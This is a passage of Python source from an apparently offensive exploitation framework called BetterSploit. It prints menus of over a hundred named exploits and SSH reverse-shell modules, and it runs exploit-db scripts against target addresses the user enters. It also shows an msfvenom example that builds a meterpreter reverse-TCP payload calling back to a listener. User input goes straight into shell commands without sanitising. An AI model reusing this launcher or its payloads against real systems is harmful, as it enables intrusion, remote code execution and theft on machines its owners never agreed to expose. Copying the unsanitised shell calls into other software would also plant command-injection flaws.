        elif fancy_shell == "show Auxiliary" or fancy_shell == "show auxiliary":
            def scanners():
                print(f"""
{Colors.red}╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{Colors.end}
{Colors.red}║{Colors.end}    Nmap Scripts                                                        Description                              {Colors.red}║
{Colors.red}║{Colors.end}    ------------                                                        -----------                              {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -sV -vv -p- -A --script=vuln                              Vulnerability Scan                       {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -sV -T2 -p- -A -sS -oN nmap_scan.txt                      Firewall Evasion                         {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -p- -vv -A --script=dns-brute                             Dns Bruteforce                           {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -vv -p- --script=http-waf-detect                          WAF Detection                            {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -vv -p- -A --script=smb-enum-users                        SMB Enumeration                          {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -sV -vv -p- -A --script=smb-enum-shares                   SMB Enumeration                          {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -p- -vv --script=http-wordpress-users                     Wordpress Enumeration                    {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -p- -vv --script=http-wordpress-enum                      Wordpress Enumeration                    {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -p- -vv --script=http-wordpress-brute                     Wordpress Bruteforce                     {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -vv -p- --script=smtp-enum-users                          SMTP Enumeration                         {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -vv -p- --script=vuln=msrpc-enum                          MSRPC Scanner                            {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -p- -vv --script=ms-sql-info                              MS-SQL Enumeration                       {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -vv -p- --script=vuln=ms-sql-dump-hashes                  MS-SQL Enumeration                       {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -vv -p- --script=mysql-dump-hashes                        MYSQL Dump Hashes                        {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -vv -p- --script=mysql-audit                              MYSQL Audit                              {Colors.red}║
{Colors.red}║{Colors.end}    sudo nmap -vv -p- --script=mysql-enum                               MYSQL Enumeration                        {Colors.red}║
{Colors.red}║{Colors.end}                                                                                                                 {Colors.red}║
{Colors.red}║{Colors.end}    Name                                                                Description                              {Colors.red}║
{Colors.red}║{Colors.end}    ----                                                                -----------                              {Colors.red}║
{Colors.red}║{Colors.end}    WpScan                                                              WordPress Vulnerability Scanner          {Colors.red}║
{Colors.red}║{Colors.end}    Nmap                                                                Network Mapper                           {Colors.red}║
{Colors.red}║{Colors.end}    AllScan                                                             Collection Of Vulnerability Scanner      {Colors.red}║
{Colors.red}║{Colors.end}    BurpSuite                                                           Web Application Security Scanner         {Colors.red}║
{Colors.red}║{Colors.end}    Zap-Proxy                                                           Web Application Security Scanner         {Colors.red}║
{Colors.red}║{Colors.end}                                                                                                                 {Colors.red}║
{Colors.red}║{Colors.end}    Scanners                                                            Description                              {Colors.red}║
{Colors.red}║{Colors.end}    --------                                                            -----------                              {Colors.red}║
{Colors.red}║{Colors.end}    OpenSSH<7.7-user-enumeration                                        Enumerate User Availability              {Colors.red}║
{Colors.red}║{Colors.end}    Microsoft-Exchange-Server-Static-Key-Flaw/cve-2020-0688-detect      Scan To See If Vulnerability Is Present  {Colors.red}║
{Colors.red}║{Colors.end}    SSH-Upload-File                                                     Upload A File Via SSH/SFTP               {Colors.red}║
{Colors.red}║{Colors.end}    SSH-Download-File                                                   Download A File Via SSH/SFTP             {Colors.red}║
{Colors.red}║{Colors.end}    SSH-Invoke-Reverse-Shell                                            Invoke Reverse Shell Via SSH             {Colors.red}║
{Colors.red}║{Colors.end}    SSH-Invoke-Remote-Code-Execution(PRE-AUTHENTICATED)                 Invoke Remote Command Execution          {Colors.red}║
{Colors.red}╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{Colors.red}\n""")

            scanners()
        elif fancy_shell == "use OpenSSH<7.7-user-enumeration":
            sub.call("python3 openssh7.7-user-enum.py", shell=True)
        elif fancy_shell == "use SSH-Upload-File":
            sub.call("python3 SSH-interaction.py upload", shell=True)
        elif fancy_shell == "use SSH-Download-File":
            sub.call("python3 SSH-interaction download", shell=True)
        elif fancy_shell == "use SSH-Invoke-Reverse-Shell":
            sub.call("python3 SSH-interaction reverse shell", shell=True)
        elif fancy_shell == "use SSH-Invoke-Remote-Code-Execution(PRE-AUTHENTICATED)":
            sub.call("python3 SSH-interaction.py command", shell=True)
        elif fancy_shell == "use Microsoft-Exchange-Server-Static-Key-Flaw/cve-2020-0688-detect":
            sub.call("python3 ../scanners/cve-2020-0688-detect.py", shell=True)
        elif fancy_shell == "use WpScan":
            target = input(f"{Colors.green}Enter URL : ")
            sub.call(f"wpscan --url {target}", shell=True)
        elif fancy_shell == "use nmap" or fancy_shell == "use Nmap":
            target_ip_address = input(f"{Colors.green}Enter Ip Address > {Colors.end}")
            sub.call(f"nmap -sV -vv -p- {target_ip_address}", shell=True)
        elif fancy_shell == "use AllScan" or fancy_shell == "use allscan":
            print(f"{Colors.green}Starting...{Colors.end}")
            sub.call("python3 ../../AllScan.py", shell=True)
        elif fancy_shell == "use BurpSuite" or fancy_shell == "use burp":
            print(f"{Colors.green}Starting...{Colors.end}")
            sub.call("burpsuite", shell=True)
        elif fancy_shell == "use Zap-Proxy" or fancy_shell == "use zap":
            print(f"{Colors.green}Starting...{Colors.end}")
            sub.call("owasp-zap", shell=True)
        elif fancy_shell == "shellcode":
            os.chdir("../shellcode/shellcode")
            sub.call("python3 handler.py", shell=True)
        elif fancy_shell == "msfvenom":
            sub.call(
                "cat /home/user/Desktop/BetterSploit/BetterSploit/BannersForBetterSploit/msfvenom.txt | lolcat -a -d 5 --seed 55",
                shell=True)
            while True:
                msfvenom_shell = input(f"{Colors.red}(Msfvenom Shell){Colors.end} [Msfvenom@CommandLine]:~#")
                if msfvenom_shell == "exit":
                    break
                elif msfvenom_shell == "banner":
                    sub.call(
                        "cat /home/user/Desktop/BetterSploit/BetterSploit/BannersForBetterSploit/msfvenom.txt | lolcat -a -d 5 --seed 55",
                        shell=True)
                elif msfvenom_shell == "example":
                    print(
                        f"{Colors.green}-p windows/meterpreter/reverse_tcp lhost=192.168.0.107 lport=5555 -f exe > / root/Desktop/reverse_tcp.exe{Colors.end}")
                else:
                    sub.call(f"msfvenom {msfvenom_shell}", shell=True)
        elif fancy_shell == "show exploits" or fancy_shell == "show Exploits":
            def exploits():
                print(
                    f"""{Colors.red}╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{Colors.end}
{Colors.red}║{Colors.end}    #    Name                                                           Description                                    {Colors.red}║
{Colors.red}║{Colors.end}    -    ----                                                           -----------                                    {Colors.red}║
{Colors.red}║{Colors.end}    1    smtplib/2.7.11-3.5.1StartTLS/Stripping                         MITM Exploit                                   {Colors.red}║
{Colors.red}║{Colors.end}    2    Server/OpenSSL/Heartbleed                                      Information Disclosure                         {Colors.red}║
{Colors.red}║{Colors.end}    3    VigileCMS/1.8/Stealth/RCE                                      Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    4    ProFTPd/1.3.5/Mod_Copy/RCE                                     Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    5    osCommerce/2.3.4.1/AFU                                         Arbitrary File Upload                          {Colors.red}║
{Colors.red}║{Colors.end}    6    SweetRice/1.5.1/File/Upload                                    Unrestricted File Upload                       {Colors.red}║
{Colors.red}║{Colors.end}    7    WordPress/4.7.0-4.7.1/Content-Injection                        Content Injection                              {Colors.red}║
{Colors.red}║{Colors.end}    8    phpMyAdmin/4.6.2/Authenticated/RCE                             Authenticated RCE                              {Colors.red}║
{Colors.red}║{Colors.end}    9    Bash/Shellshock/Environment-Variables/CMD-Injection            OS Command Injection                           {Colors.red}║
{Colors.red}║{Colors.end}    10   ManageEngine-opManager/12.3.150/RCE                            Authenticated Code Execution                   {Colors.red}║
{Colors.red}║{Colors.end}    11   TinyWebGallery-1.7.6/LFI/RCE                                   Local File Inclusion / Remote Code Execution   {Colors.red}║
{Colors.red}║{Colors.end}    12   Traq-2.3/RCE                                                   Authentication Bypass / Remote Code Execution  {Colors.red}║
{Colors.red}║{Colors.end}    13   TYPO3/Arbitrary-File-Retrieval                                 Arbitrary File Retrieval1                      {Colors.red}║
{Colors.red}║{Colors.end}    14   WebAsys/Blind-SQL-Injection                                    Blind SQL Injection                            {Colors.red}║
{Colors.red}║{Colors.end}    15   Dovecot/IMAP/1.0.10-1.1rc2/RED                                 Remote Email Disclosure                        {Colors.red}║
{Colors.red}║{Colors.end}    16   Zomplog/3.8.1/AFU                                              Arbitrary File Upload                          {Colors.red}║
{Colors.red}║{Colors.end}    17   ColdFusion/9-10/Credential-Disclosure                          Credential Disclosure                          {Colors.red}║
{Colors.red}║{Colors.end}    18   Dovecot/IMAP/1.0.10-1.1rc2                                     Remote Email Disclosure                        {Colors.red}║
{Colors.red}║{Colors.end}    19   Wolf-CMS/0.8.2/AFU                                             Arbitrary File Upload                          {Colors.red}║
{Colors.red}║{Colors.end}    20   Wordpress-Plugin/Simple-File-List/5.4/RCE                      Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    21   WordPress-Plugin/Download-Manager/2.7.4/RCE                    Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    22   WordPress-Plugin/wpDataTables/1.5.3/AFU                        Arbitrary File Upload                          {Colors.red}║
{Colors.red}║{Colors.end}    23   Joomla/1.5<3.4.5/Object-Injection/x-forwarded-for/Header/RCE   Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    24   phosheezy/2.0/RCE                                              Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    25   Multiple-WordPress-Plugins/AFU                                 Arbitrary File Upload                          {Colors.red}║
{Colors.red}║{Colors.end}    26   Microsoft-Windows-7/2008-R2/EternalBlue/SMB                    Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    27   Microsoft-Windows-8/8.1/2012-R2-(x64)/EternalBlue/SMB          Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    28   Apache-Tomcat-AJP/Ghostcat/File-Read/Inclusion                 File Read/Inclusion                            {Colors.red}║
{Colors.red}║{Colors.end}    29   WordPress-Plugin-Zingiri-2.2.3/ajax_save_name.php              Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    30   Apache+PHP-5.3.12<5.4.2/RCE+Scanner                            Remote Code Execution / Scanner                {Colors.red}║
{Colors.red}║{Colors.end}    31   Apache-CouchDB<2.1.0/RCE                                       Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    32   Apache-James-Server/2.3.2/RCE                                  Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    33   Apache-mod_cgi-Shellshock/RCI                                  Remote Command Injection                       {Colors.red}║
{Colors.red}║{Colors.end}    34   Apache/mod_jk/1.2.19/(Windows x86)/RBO                         Remote Buffer Overflow                         {Colors.red}║
{Colors.red}║{Colors.end}    35   Apache-Solr-8.2.0/RCE                                          Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    36   Apache-Struts/REST-Plugin-With-Dynamic-Method-Invocation/RCE   Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    37   Apache-Struts/2.0.1<2.3.33<2.5<2.5.10/ACE                      Arbitrary Code Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    38   Apache-Struts/2.3<2.3.34<2.5<2.5.16/RCE                        Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    39   Apache-Struts/2.3.x/Showcase/RCE                               Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    40   Apache-Struts/2.5<2.5.12/REST-Plugin-XStream/RCE               Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    41   Apache-Tomcat/WebDAV/Remote-File-Disclosure                    Remote-File-Disclosure                         {Colors.red}║
{Colors.red}║{Colors.end}    42   Apache-Tomcat-AJP/Ghostcat/File-Read/Inclusion                 File-Read / Inclusion                          {Colors.red}║
{Colors.red}║{Colors.end}    43   Apache-Tomcat<9.0.1<8.5.23<8.0.47<7.0.8/JSP/Upload-Bypass/RCE  Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    44   Joomla-Component-Recerca/SQL-Injection                         SQL Injection                                  {Colors.red}║
{Colors.red}║{Colors.end}    45   CNC-Telnet/Remote-Command-Execution                            CNC Remote Command Execution                   {Colors.red}║
{Colors.red}║{Colors.end}    46   OpenSSH-7.2p1/(Authenticated)/xauth-Command-Injection          Command Injection                              {Colors.red}║
{Colors.red}║{Colors.end}    47   NetGain-EM-Plus/10.1.68/RCE                                    Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    48   phpMyAdmin/pmaPWN!/Code-Injection/Remote-Code-Execution        Code Injection / Remote Code Execution         {Colors.red}║
{Colors.red}║{Colors.end}    49   phpMyAdmin/3.x/Swekey/Remote-Code-Injection                    Remote Code Injection                          {Colors.red}║
{Colors.red}║{Colors.end}    50   Broken-faq.php-frameork/Remote-Command-Execution               Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    51   WzdFTPD/8.0/DOS                                                Remote Denial Of Service                       {Colors.red}║
{Colors.red}║{Colors.end}    52   Mida-eFramework-2.9.0/RCE                                      Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    53   Complaint-Management-System-1.0/cid-SQL-Injection              SQL Injection                                  {Colors.red}║
{Colors.red}║{Colors.end}    54   Drupal/7.0-7.31/SQL-Injection-ADD-ADMIN-USER                   SQL Injection ADD ADMIN USER                   {Colors.red}║
{Colors.red}║{Colors.end}    55   Webmin/Brute-Force/Remote-Command-Execution                    BruteForce/Remote Command Execution            {Colors.red}║
{Colors.red}║{Colors.end}    56   Webmin/<1.290<1.220/Arbitrary-File-Disclosure                  Arbitrary File Disclosure                      {Colors.red}║
{Colors.red}║{Colors.end}    57   Nagios-XI/5.6.5/Remote-Code-Execution/Privilege-Escalation     Remote Code Execution / Privilege Escalation   {Colors.red}║
{Colors.red}║{Colors.end}    58   Nagios-XI/5.2.6<5.4-Chained-Remote-Root                        Chained Remote Root                            {Colors.red}║
{Colors.red}║{Colors.end}    59   Apache-Tika-Server/<1.8/Arbitrary-File-Download                Arbitrary File Download                        {Colors.red}║
{Colors.red}║{Colors.end}    60   Apache-Tika-server/<1.18/Command-Injection                     Remote Command Injection                       {Colors.red}║
{Colors.red}║{Colors.end}    61   IOT-DEATH/Telnet-0-Day/Remote-Command-Execution/POC            Remote Command Injection                       {Colors.red}║
{Colors.red}║{Colors.end}    62   Imperva-SecureSphere/<13/Remote-Command-Execution              Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    63   WarFTP-1.65/(Windows 2000 SP4)-USER/Remote-Buffer-Overflow     Remote Buffer Overflow                         {Colors.red}║
{Colors.red}║{Colors.end}    64   BraveStarr/Remote-Fedora<31-telnetd-exploit                    Multiple Exploits                              {Colors.red}║           
{Colors.red}║{Colors.end}    65   SSHtranger-Things/Multiple-Exploits                            Multiple Exploits                              {Colors.red}║
{Colors.red}║{Colors.end}    66   ManageEngine-Applications-Manager-Authenticated-RCE            Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    67   libssh-bypass-Authentication                                   Bypass Authentication                          {Colors.red}║
{Colors.red}║{Colors.end}    68   ClearPass-Policy-Manager-Unauthenticated-RCE                   Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    69   Cisco-7937G/All-In-One                                         All In One                                     {Colors.red}║
{Colors.red}║{Colors.end}    70   Agent-Tesla-Botnet/Multi                                       SQL Injection / Remote Command Execution       {Colors.red}║
{Colors.red}║{Colors.end}    71   Apache-CouchDB/Pre-Authenticated-Remote-Privilege-Escalation   Remote Privilege Escalation                    {Colors.red}║
{Colors.red}║{Colors.end}    72   Cayin-Digital-Signage-System-xPost-2.5/RCI                     Remote Command Injection                       {Colors.red}║
{Colors.red}║{Colors.end}    73   eGroupWare<1.14-spellchecker/Remote-Command-Execution          Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    74   FaceSentry-Access-Control-System<6.4.8/Remote-Root-Exploit     Remote Root Exploit                            {Colors.red}║
{Colors.red}║{Colors.end}    75   Joomla-hdwplayer<4.2/search.php/SQL-Injection                  SQL Injection                                  {Colors.red}║
{Colors.red}║{Colors.end}    76   LibreHealth<2.0-Pre-Authenticated-Remote-Command-Execution     Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    77   Online-Course-Registration-1.0/Unauthenticated-RCE             Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    78   PHPFusion<9.03.50-PHP-Object-Injection-to-SQL-injection        SQL Injection                                  {Colors.red}║
{Colors.red}║{Colors.end}    79   Pi-Hole<4.3.2/Pre-Authenticated-Remote-Command-Execution       Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    80   PulseSecure<9.0/Remote-Command-Execution                       Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    81   rConfig<3.9.4-search.crud.php                                  Remote Command Injection                       {Colors.red}║
{Colors.red}║{Colors.end}    82   Ruby-On-Rails<5.0.1-Remote-Command-Execution                   Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    83   Tailor-Management-System/(id)-SQL-Injection-Vulnerability      SQL Injection                                  {Colors.red}║
{Colors.red}║{Colors.end}    84   SMBGhost                                                       Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    85   Symantec-Web-Gateway<5.0.2.8-RCE                               Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    86   Umbraco<7.12.4/Remote-Command-Execution                        Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    87   CGI-In-WebDAV-Yaws-Web-Server<2.0.7/OS-CMD-Injection           OS Command Injection                           {Colors.red}║
{Colors.red}║{Colors.end}    88   WebDAV-implementation-In-Yaws-Web-Server<2.0.7/XXE-injection   XXE Injection                                  {Colors.red}║
{Colors.red}║{Colors.end}    89   Microsoft-Exchange-Server-Static-Key-Flaw/RCE                  Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    90   'BIG-IP'-Traffic-Management-User<15.1.0.3/RCE                  Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    91   SMBleedingGhost/CVE-2020-0796-RCE-POC                          Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    92   Mambo-com_akogallery/Sql-Injection                             SQL Injection                                  {Colors.red}║
{Colors.red}║{Colors.end}    93   vBulletin<5.5.4-Pre-Authenticated/Remote-Command-Execution     Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    94   ZeroLogon-Microsoft-Netlogon/set-password-to-empty-string      Remote Password Reset + Checker                {Colors.red}║
{Colors.red}║{Colors.end}    95   upload-pwn-RCE(POC)                                            Chained Remote Command Execution               {Colors.red}║
{Colors.red}║{Colors.end}    96   PHP<7.x/Remote-Command-Execution/CVE-2019-11043                Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    97   upload-pwn-RS(POC)                                             Chained RFU Into Reverse Shell                 {Colors.red}║
{Colors.red}║{Colors.end}    98   FPM+PHP-versions<7.3.11/Remote-Code-Execution                  Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    99   Pre-Authenticated-Discord-Account-Disabler                     Pre Authenticated Account Disable              {Colors.red}║
{Colors.red}║{Colors.end}    100  SpamTitan<7.07/Unauthenticated-RCE                             Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    101  ProFTPd<1.3.5-mod_copy/Unauth-Remote-Command-Execution         Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    102  ProFTPd<1.3.5-mod_copy/Unauth-Remote-File-Upload               Unauthenticated Remote File Upload             {Colors.red}║
{Colors.red}║{Colors.end}    103  ProFTPd<1.3.5-mod_copy/Unauth-Invoke-Reverse-Shell             Unauthenticated Invoke Reverse Shell           {Colors.red}║
{Colors.red}║{Colors.end}    104  Wordpress-Plugin-File-Manager<6.9/Unauthenticated-RCE          Unauth Remote Command Execution                {Colors.red}║
{Colors.red}║{Colors.end}    105  Wordpress-Plugin-File-Manager<6.9/Unauthenticated-AFU          Unauth Arbitrary File Upload                   {Colors.red}║
{Colors.red}║{Colors.end}    106  Seo-Panel<4.6.0/Authenticated-Remote-Code-Execution            Authenticated Remote Code Execution            {Colors.red}║
{Colors.red}║{Colors.end}    107  upload-pwn-ASP--POC                                            Remote-File-Upload(ASP)                        {Colors.red}║
{Colors.red}║{Colors.end}    108  upload-pwn-PERL--POC                                           Remote-File-Upload(PERL)                       {Colors.red}║
{Colors.red}║{Colors.end}    109  upload-pwn-PHP--POC                                            Remote-File-Upload(PHP)                        {Colors.red}║
{Colors.red}║{Colors.end}    110  Oracle-WebLogic-Server<12.2.1.4/Unauthenticated-RCE            Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    111  rConfig-3.9.5/Remote-Code-Execution-Unauthenticated            Remote Code Execution / Auth bypass            {Colors.red}║
{Colors.red}║{Colors.end}    112  ReQuest-Serious-Play-F3-Media-Server/<7.0.3/RCE                Remote Code Execution                          {Colors.red}║
{Colors.red}║{Colors.end}    113  CloudMe/1.11.2/Chained-RCE                                     RBO Into Remote Command Execution              {Colors.red}║
{Colors.red}║{Colors.end}    114  Apache-Struts-2/DefaultActionMapper-Prefixes-OGNL/RCE          Remote Command Execution                       {Colors.red}║
{Colors.red}║{Colors.end}    115  Windows-10/MailCarrier/2.51/POP3-'USER'/RBO                    Chained Remote Command Execution               {Colors.red}║
{Colors.red}║{Colors.end}    116  Pre-Auth-Django-Password-Reset                                 Pre Authenticated Password Reset               {Colors.red}║
{Colors.red}║{Colors.end}                                                                                                                       {Colors.red}║
{Colors.red}║{Colors.end}    Module                                                              Description                                    {Colors.red}║
{Colors.red}║{Colors.end}    ------                                                              -----------                                    {Colors.red}║
{Colors.red}║{Colors.end}    SqlMap                                                              SQL Injection Module                           {Colors.red}║
{Colors.red}║{Colors.end}    Commix                                                              OS Command Injection Module                    {Colors.red}║
{Colors.red}║{Colors.end}    RouterSploit                                                        Router Exploitation Module                     {Colors.red}║
{Colors.red}║{Colors.end}    Eva                                                                 Firewall Evasion & Pentesting Tool             {Colors.red}║
{Colors.red}║{Colors.end}    AnyLizer                                                            PHP Static Code Analysis Tool                  {Colors.red}║
{Colors.red}╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{Colors.end}\n""")

            exploits()
        elif fancy_shell[:2] == "cd":
            count += 1
            if count > 1:
                os.chdir(fancy_shell[3:])
            else:
                os.chdir(fancy_shell[3:])
                print(
                    f"[{Colors.red}Warning{Colors.end}] You must be in the 'BetterSploit/modules' directory to use any exploits/modules/etc")

        elif fancy_shell[:6] == "search":
            data = fancy_shell[7:]
            sub.call(f"cat list.txt | grep --ignore-case {data}", shell=True)
        elif fancy_shell == "use smtplib/2.7.11-3.5.1StartTLS/Stripping" or fancy_shell == "use 1":
            print(
                f"{Colors.green}python BetterSploit/modules/smtplib_starttls_stripping_mitm.py{Colors.end}")
            sub.call("python BetterSploit/modules/smtplib_starttls_stripping_mitm.py", shell=True)
        elif fancy_shell == "use Server/OpenSSL/Heartbleed" or fancy_shell == "use 2":
            print(f"{Colors.green}python /usr/share/exploitdb/exploits/multiple/remote/32745.py{Colors.end}")
            sub.call("python /usr/share/exploitdb/exploits/multiple/remote/32745.py", shell=True)
        elif fancy_shell == "use VigileCMS/1.8/Stealth/RCE" or fancy_shell == "use 3":
            target_address = input(f"{Colors.red}(Vigile CMS <1.8 Stealth RCE){Colors.end} [Enter Target Ip Address]:~#")
            path_address = input(f"{Colors.red}(Vigile CMS <1.8 Stealth RCE){Colors.end} [Enter Path To Vigile CMS]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/php/webapps/4643.py {target_address} {path_address}", shell=True)
        elif fancy_shell == "use ProFTPd/1.3.5/Mod_Copy/RCE" or fancy_shell == "use 4":
            server = input(f"{Colors.red}(ProFTPD 1.3.5 Mod_Copy RCE){Colors.end} [Enter Server Address]:~#")
            directory = input(f"{Colors.red}(ProFTPD 1.3.5 Mod_Copy RCE){Colors.end} [Enter Directory]:~#")
            cmd = input(f"{Colors.red}(ProFTPD 1.3.5 Mod_Copy RCE){Colors.end} [Enter Command]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/linux/remote/36803.py {server} {directory} {cmd}", shell=True)
        elif fancy_shell == "use osCommerce/2.3.4.1/AFU" or fancy_shell == "use 5":
            target_url = input(f"{Colors.red}(osCommerce 2.3.4.1 Arbitrary File Upload){Colors.end} [Enter Target URL]:~#")
            auth = input(f"{Colors.red}(osCommerce 2.3.4.1 Arbitrary File Upload){Colors.end} [Enter Credentials (user:pass)]:~#")
            file_to_upload = input(f"{Colors.red}(osCommerce 2.3.4.1 Arbitrary File Upload){Colors.end} [Enter Local File To Upload]:~#")
            admin_path = input(f"{Colors.red}(osCommerce 2.3.4.1 Arbitrary File Upload){Colors.end} [Enter Admin Path]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/php/webapps/43191.py -u {target_url} -a {auth} -f {file_to_upload} -p {admin_path}", shell=True)
        elif fancy_shell == "use SweetRice/1.5.1/File/Upload" or fancy_shell == "use 6":
            sub.call("python /usr/share/exploitdb/exploits/php/webapps/40716.py", shell=True)
        elif fancy_shell == "use WordPress/4.7.0-4.7.1/Content-Injection" or fancy_shell == "use 7":
            url = input(f"{Colors.red}(WordPress <4.7.1 Content Injection){Colors.end} [Enter URL]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/linux/webapps/41223.py {url}", shell=True)
        elif fancy_shell == "use phpMyAdmin/4.6.2/Authenticated/RCE" or fancy_shell == "use 8":
            user = input(f"{Colors.red}(phpMyAdmin 4.6.2 Authenticated RCE){Colors.end} [Enter Username]:~#")
            passwwd = input(f"{Colors.red}(phpMyAdmin 4.6.2 Authenticated RCE){Colors.end} [Enter Password]:~#")
            dbms = input(f"{Colors.red}(phpMyAdmin 4.6.2 Authenticated RCE){Colors.end} [Enter Existing Database At A Server]:~#")
            url = input(f"{Colors.red}(phpMyAdmin 4.6.2 Authenticated RCE){Colors.end} [Enter Target URL]:~#")
            cmd = input(f"{Colors.red}(phpMyAdmin 4.6.2 Authenticated RCE){Colors.end} [Enter Command]:~#")
            table = input(f"{Colors.red}(phpMyAdmin 4.6.2 Authenticated RCE){Colors.end} [Enter Table]:~#")
            sub.call(f"python /usr/share/exploitdb/exploits/php/webapps/40185.py -u {user} -p {passwwd} -c {cmd} -d {dbms} -T {table} {url}", shell=True)
        elif fancy_shell == "use Bash/Shellshock/Environment-Variables/CMD-Injection" or fancy_shell == "use 9":
            url_target = input(f"{Colors.red}(Bash Shellshock Environment Variables CMD Injection){Colors.end} [Enter Target URL]:~#")
            command_cmd = input(f"{Colors.red}(Bash Shellshock Environment Variables CMD Injection){Colors.end} [Enter Command]:~#")
            sub.call(f"php /usr/share/exploitdb/exploits/linux/remote/34766.php -u {url_target} -c {command_cmd}", shell=True)
        elif fancy_shell == "use ManageEngine-opManager/12.3.150/RCE" or fancy_shell == "use 10":
            usernamez = input(f"{Colors.red}(ManageEngine opManager 12.3.150 RCE){Colors.red} [Enter Username]:~#")
            password = input(f"{Colors.red}(ManageEngine opManager 12.3.150 RCE){Colors.red} [Enter Passowrd]:~#")
            target = input(f"{Colors.red}(ManageEngine opManager 12.3.150 RCE){Colors.red} [Enter Target URL (full url)]:~#")
            command_cmd_cmd = input(f"{Colors.red}(ManageEngine opManager 12.3.150 RCE){Colors.red} [Enter Command]:~#")
            sub.call(f"python3 /usr/share/exploitdb/exploits/windows/webapps/47255.py -u {usernamez} -p {password} -t {target} -c {command_cmd_cmd}", shell=True)
        elif fancy_shell == "use TinyWebGallery-1.7.6/LFI/RCE" or fancy_shell == "use 11":
            host = input(f"{Colors.red}(TinyWebGallery 1.7.6 LFI/RCE){Colors.end} [Enter Host]:~#")
            path = input(f"{Colors.red}(TinyWebGallery 1.7.6 LFI/RCE){Colors.end} [Enter Path]:~#")
            sub.call(f"php /usr/share/exploitdb/exploits/php/webapps/8649.php {host} {path}", shell=True)
        elif fancy_shell == "use Traq-2.3/RCE" or fancy_shell == "use 12":
            host = input(f"{Colors.red}(Traq 2.3 RCE){Colors.end} [Enter Host]:~#")
            path = input(f"{Colors.red}(Traq 2.3 RCE){Colors.end} [Enter Path]:~#")
            sub.call(f"php /usr/share/exploitdb/exploits/php/webapps/18213.php {host} {path}", shell=True)
        elif fancy_shell == "use TYPO3/Arbitrary-File-Retrieval" or fancy_shell == "use 13":
            valid_url = input(f"{Colors.red}(TYPO3 Arbitrary File Retrieval){Colors.end} [Enter URL]:~#")
            ParallelRequests = input(f"{Colors.red}(TYPO3 Arbitrary File Retrieval){Colors.end} [Enter Parallel Requests]:~#")
            sub.call(f"php /usr/share/exploitdb/exploits/php/webapps/15856.php {valid_url} {ParallelRequests}", shell=True)
        elif fancy_shell == "use WebAsys/Blind-SQL-Injection" or fancy_shell == "use 14":
            sub.call("php /usr/share/exploitdb/exploits/php/webapps/12724.php", shell=True)
        elif fancy_shell == "use Dovecot/IMAP/1.0.10-1.1rc2/RED" or fancy_shell == "use 15":
            hostname = input(f"{Colors.red}(Dovecot IMAP 1.0.10-1.1rc2 RED{Colors.end} [Enter Hostname/Ip-Address]:~#")
